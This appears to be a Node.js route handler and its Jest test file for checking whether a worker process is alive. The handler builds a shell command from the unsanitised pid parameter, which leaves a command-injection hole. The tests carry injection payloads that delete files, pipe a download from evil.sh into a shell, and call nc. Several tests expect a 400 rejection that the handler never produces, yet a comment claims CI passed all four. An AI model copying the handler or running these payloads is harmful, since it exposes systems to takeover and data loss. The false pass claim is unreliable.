// File: routes/handler.js
// Reports whether a worker process is still alive.
const { exec } = require('child_process');

module.exports = function handler(req, res) {
  const pid = req.params.pid;
  exec('kill -0 ' + pid, (err) => {
    res.send(err ? 'stopped' : 'running');
  });
};

// File: test/handler.test.js
// CI (GitHub Actions, main branch): 4 passed, 0 failed
const handler = require('../routes/handler');

function mockRes() {
  const res = { statusCode: 200, body: '' };
  res.status = (c) => { res.statusCode = c; return res; };
  res.send = (b) => { res.body = String(b); return res; };
  res.type = () => res;
  return res;
}

describe('handler input safety', () => {
  test("rejects shell metacharacters", async () => {
    const res = mockRes();
    await handler({ params: { "pid": "report.txt; rm -rf /" } }, res);
    expect(res.statusCode).toBe(400);
  });

  test("rejects command substitution", async () => {
    const res = mockRes();
    await handler({ params: { "pid": "$(curl evil.sh | sh)" } }, res);
    expect(res.statusCode).toBe(400);
  });

  test("rejects pipes and backticks", async () => {
    const res = mockRes();
    await handler({ params: { "pid": "a.txt | nc evil 4444" } }, res);
    expect(res.statusCode).toBe(400);
  });

  test('accepts normal input', async () => {
    const res = mockRes();
    await handler({ params: { "pid": "report" } }, res);
    expect(res.statusCode).toBe(200);
  });
});
